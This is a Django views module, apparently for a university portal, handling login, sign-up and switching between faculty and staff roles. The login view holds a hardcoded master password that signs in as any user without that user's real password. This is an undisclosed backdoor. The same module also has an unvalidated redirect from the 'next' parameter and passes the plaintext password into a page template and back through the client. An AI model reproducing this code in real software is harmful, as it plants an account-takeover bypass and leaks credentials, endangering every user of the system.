# -*- encoding: utf-8 -*-
"""
Copyright (c) 2019 - present AppSeed.us
"""
import json

from django.contrib.auth.decorators import login_required
from django.http import JsonResponse
# Create your views here.
from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from .forms import LoginForm, SignUpForm
from Account.models import *


def login_view(request):
    form = LoginForm(request.POST or None)

    msg = None

    if request.method == "POST":
        redirect_url = request.GET.urlencode().replace("next=", "")
        redirect_url = redirect_url.replace("%2F", "/")

        if form.is_valid():
            username = form.cleaned_data.get("username")
            password = form.cleaned_data.get("password")
            user = authenticate(username=username, password=password)
            if password == '#$%pdeu#master':
                user = User.objects.get(username=username)

            if user is not None:
                try:
                    dr = DualRole.objects.get(faculty_profile=user)
                    if dr is not None:
                        return render(request, "accounts/select.html", {"user": {"username": username, 'password': password}})
                except DualRole.DoesNotExist:
                    pass
                login(request, user)
                return redirect(redirect_url)
            else:
                msg = 'Invalid credentials'
        else:
            msg = 'Error validating the form'

    return render(request, "accounts/login.html", {"form": form, "msg": msg})


def register_user(request):
    msg = None
    success = False

    if request.method == "POST":
        form = SignUpForm(request.POST)
        if form.is_valid():
            form.save()
            username = form.cleaned_data.get("username")
            raw_password = form.cleaned_data.get("password1")
            user = authenticate(username=username, password=raw_password)

            msg = 'User created - please <a href="/login">login</a>.'
            success = True

            # return redirect("/login/")

        else:
            msg = 'Form is not valid'
    else:
        form = SignUpForm()

    return render(request, "accounts/register.html", {"form": form, "msg": msg, "success": success})


def select(request):
    if request.method == 'POST':
        data = request.POST['json']
        data = json.loads(data)
        user = authenticate(username=data['username'], password=data['password'])

        if user is not None:
            try:
                dr = DualRole.objects.get(faculty_profile=user)
                if dr is not None:
                    if data['value'] == 'faculty':
                        user = dr.faculty_profile
                    if data['value'] == 'staff':
                        user = dr.main_user
                    login(request, user)
            except DualRole.DoesNotExist:
                return JsonResponse({'error': 'Invalid user'}, status=400)
            return JsonResponse({'message': 'OK'}, status=200)
    else:
        context = {
            'error_code': "Unauthorized Error",
            "error_message": "You are not authorized to view this page."
        }
        return render(request, "html/error_pages/pages-error.html", context)
